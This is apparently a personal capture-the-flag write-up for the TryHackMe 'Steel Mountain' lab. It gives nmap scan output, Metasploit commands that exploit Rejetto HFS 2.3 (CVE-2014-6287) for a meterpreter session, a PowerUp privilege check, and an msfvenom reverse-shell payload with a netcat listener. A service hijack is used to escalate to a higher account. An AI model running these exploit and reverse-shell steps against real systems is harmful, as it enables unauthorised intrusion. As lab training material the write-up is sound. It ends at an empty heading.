# TRYHACKME : Steel Mountain
> **NOTE: Straightforward. Copied from my local folder, some past saved format might be not saved or missing.**

## NMAP
```
nmap -T5 -A 10.10.253.181 
PORT      STATE    SERVICE            VERSION
80/tcp    open     http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1038/tcp  filtered mtqp
1310/tcp  filtered husky
3372/tcp  filtered msdtc
3389/tcp  open     ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-02-27T07:18:27+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-02-26T06:57:45
|_Not valid after:  2025-08-28T06:57:45
|_ssl-date: 2025-02-27T07:18:34+00:00; +11s from scanner time.
4567/tcp  filtered tram
5801/tcp  filtered vnc-http-1
6004/tcp  filtered X11:4
8080/tcp  open     http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49156/tcp open     msrpc              Microsoft Windows RPC
49161/tcp filtered unknown
49163/tcp open     msrpc              Microsoft Windows RPC
62078/tcp filtered iphone-sync
Aggressive OS guesses: Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 (95%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows Server 2012 R2 Update 1 (95%), Microsoft Windows Vista SP1 (94%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP1 (93%), Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-27T07:18:28
|_  start_date: 2025-02-27T06:57:38
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:4d:3b:df:d0:a1 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 10s, deviation: 0s, median: 10s

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   138.27 ms 10.4.0.1
2   ... 3
4   394.55 ms 10.10.253.181
```

## PORT 8080
- File Server: Rejetto HTTP File Server 2.3
- Exploit: CVE 2014-6287 https://www.exploit-db.com/exploits/34668

## MSFCONSOLE
search rejetto HTTP file server 2.3
use 1 (with the 2014-6287)
```
set RHOSTS 10.10.253.181
set RPORT 8080
set SRVHOST 10.4.124.80
set LHOST 10.4.124.80
run
```

### meterpreter:
```
(pwd: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
cat C:\Users\bill\Desktop\user.txt
```

## POWERUP
> download script from provided link
### meterpreter:
```
upload <LocalFilePathFor=PowerUp.ps1>
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

> open new terminal
```
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
sudo nc -lvnp 4443
```
## meterpreter:
```
upload <LocalFilePathFor=Advanced.exe>
shell
sc stop "AdvancedSystemCareService9"
sc start "AdvancedSystemCareService9"
```

## netcat:
